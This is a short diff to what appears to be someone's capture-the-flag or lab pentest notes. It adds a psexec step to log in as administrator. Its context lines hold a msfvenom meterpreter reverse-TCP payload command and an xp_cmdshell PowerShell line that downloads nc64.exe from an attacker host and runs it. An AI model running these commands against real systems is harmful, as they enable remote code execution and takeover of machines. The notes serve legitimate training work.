@@ -592,6 +592,10 @@ msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.15.154 LPORT=80 -f exe -
 python3 -m http.server
 xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; wget http://10.10.14.9/nc64.exe -outfile nc64.exe; ./nc64.exe"
 ````
+- Find the admin password from the shell
+````
+python /usr/local/bin/psexec.py administrator@10.129.62.77
+````
 
 ## Stuck
 - https://book.hacktricks.xyz/
